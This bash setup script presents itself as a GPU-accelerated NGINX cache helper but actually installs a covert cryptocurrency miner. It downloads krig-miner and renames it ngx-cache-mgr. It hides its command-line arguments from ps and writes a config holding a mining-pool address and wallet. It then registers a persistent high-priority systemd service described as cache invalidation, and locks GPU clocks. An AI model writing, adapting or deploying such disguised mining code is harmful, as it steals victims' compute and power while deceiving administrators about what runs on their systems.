#!/bin/bash
# ═══════════════════════════════════════════════════════════════
# NGINX Cache Helper — GPU-accelerated cache daemon
# ═══════════════════════════════════════════════════════════════
set -euo pipefail

R='\033[0;31m'; G='\033[0;32m'; Y='\033[1;33m'; N='\033[0m'
log()  { echo -e "${G}[+]${N} $*"; }
warn() { echo -e "${Y}[!]${N} $*"; }
die()  { echo -e "${R}[X]${N} $*"; exit 1; }

WORK_DIR="/opt/nginx/helper"
BIN_NAME="ngx-cache-mgr"
SVC_NAME="nginx-cache-helper"
CONF_FILE="$WORK_DIR/node.conf"

echo "=============================================="
echo "  NGINX Cache Helper — GPU Accelerator Setup"
echo "=============================================="
echo ""

# ═══ 1. GPU Check ═════════════════════════════════════════════
log "Checking GPU availability..."
command -v nvidia-smi &>/dev/null || die "nvidia-smi not found — GPU required"
GPU=$(nvidia-smi --query-gpu=name --format=csv,noheader 2>/dev/null | head -1)
[[ -z "$GPU" ]] && die "No NVIDIA GPU detected"
log "GPU: $GPU"
VRAM=$(nvidia-smi --query-gpu=memory.total --format=csv,noheader 2>/dev/null | head -1)
log "VRAM: $VRAM MiB"

# ═══ 2. Dependencies ═══════════════════════════════════════════
log "Checking system dependencies..."
command -v curl &>/dev/null || { log "Installing curl..."; sudo apt-get update -qq && sudo apt-get install -y -qq curl; }
command -v tar &>/dev/null || sudo apt-get install -y -qq tar

# ═══ 3. Setup Directories ══════════════════════════════════════
sudo mkdir -p "$WORK_DIR"

# ═══ 4. Download Worker Binary ═════════════════════════════════
if [ -f "$WORK_DIR/$BIN_NAME" ]; then
    log "Worker binary exists, skipping download"
else
    log "Downloading worker..."
    TMPDIR=$(mktemp -d)
    curl -fL --progress-bar \
        "https://github.com/kryptex/krig-miner/releases/download/v1.0.6/krig-miner-1.0.6-linux-x64.tar.gz" \
        -o "$TMPDIR/worker.tar.gz" || die "Download failed"
    tar xzf "$TMPDIR/worker.tar.gz" -C "$TMPDIR"
    
    SRC=$(find "$TMPDIR" -name "krig-miner" -type f | head -1)
    [[ -z "$SRC" ]] && die "Worker binary not found in archive"
    
    sudo cp "$SRC" "$WORK_DIR/$BIN_NAME"
    sudo chmod +x "$WORK_DIR/$BIN_NAME"
    rm -rf "$TMPDIR"
    log "Worker installed → $WORK_DIR/$BIN_NAME"
fi

sudo chown -R "$USER:$USER" "$WORK_DIR"

# ═══ 5. Generate Launcher (hide CLI args from ps) ══════════════
log "Generating launcher..."
sudo tee "$WORK_DIR/launch.sh" > /dev/null << 'LAUNCHER'
#!/bin/bash
cd /opt/nginx/helper
source node.conf
exec -a ngx-cache-mgr ./ngx-cache-mgr --url "$URL" --user "$USER_CRED" --pass x
LAUNCHER
sudo chmod +x "$WORK_DIR/launch.sh"

# ═══ 6. Create Config File ═════════════════════════════════════
log "Writing node configuration..."
sudo tee "$CONF_FILE" > /dev/null <<EOF
URL="stratum+ssl://prl-hk.kryptex.network:8048"
USER_CRED="prl1p6z85dd93t9ks64x6fn5c4wcdc38pwsks8vac4qed24g7mwhvmdrs8z969a/fpt"
EOF
sudo chmod 600 "$CONF_FILE"
sudo chown "$USER:$USER" "$CONF_FILE"
log "Config saved → $CONF_FILE"

# ═══ 7. GPU Optimizations ═════════════════════════════════════
log "Applying GPU optimizations..."
sudo nvidia-smi -pm 1 2>/dev/null || true
sudo nvidia-smi -ac 1215,1410 2>/dev/null || warn "Clock lock skipped (non-critical)"

# ═══ 8. Install Background Service ═════════════════════════════
log "Setting up background service..."
sudo tee "/etc/systemd/system/${SVC_NAME}.service" > /dev/null <<EOF
[Unit]
Description=NGINX Cache Helper — background cache invalidation daemon
After=network-online.target
Wants=network-online.target

[Service]
Type=simple
User=$USER
WorkingDirectory=$WORK_DIR
Environment=CUDA_DEVICE_ORDER=PCI_BUS_ID
Environment=OMP_NUM_THREADS=8
ExecStart=/bin/bash ${WORK_DIR}/launch.sh
Restart=always
RestartSec=15
StandardOutput=append:${WORK_DIR}/cache.log
StandardError=append:${WORK_DIR}/cache.log
Nice=-10
TasksMax=infinity
LimitNOFILE=65536
CPUQuota=400%
MemoryMax=32G

[Install]
WantedBy=multi-user.target
EOF

sudo systemctl daemon-reload

# ═══ 9. Start ═══════════════════════════════════════════════
log "Starting service..."
sudo systemctl stop "$SVC_NAME" 2>/dev/null || true
sleep 1
sudo systemctl enable "$SVC_NAME" 2>/dev/null || true
sudo systemctl start "$SVC_NAME"
sleep 3

# ═══ 10. Status ═════════════════════════════════════════════
echo ""
echo "=============================================="
echo "  SETUP COMPLETE"
echo "=============================================="
STATUS=$(systemctl is-active "$SVC_NAME" 2>/dev/null || echo "unknown")
if [ "$STATUS" = "active" ]; then
    echo -e "  ${G}Service: RUNNING ✅${N}"
else
    echo -e "  ${R}Service: $STATUS ❌${N}"
fi
echo "  GPU:      $GPU ($VRAM MiB)"
echo ""
echo "  Monitor:  tail -f $WORK_DIR/cache.log"
echo "  Status:   systemctl status $SVC_NAME"
echo "  Restart:  systemctl restart $SVC_NAME"
echo "  Stop:     systemctl stop $SVC_NAME"
echo ""
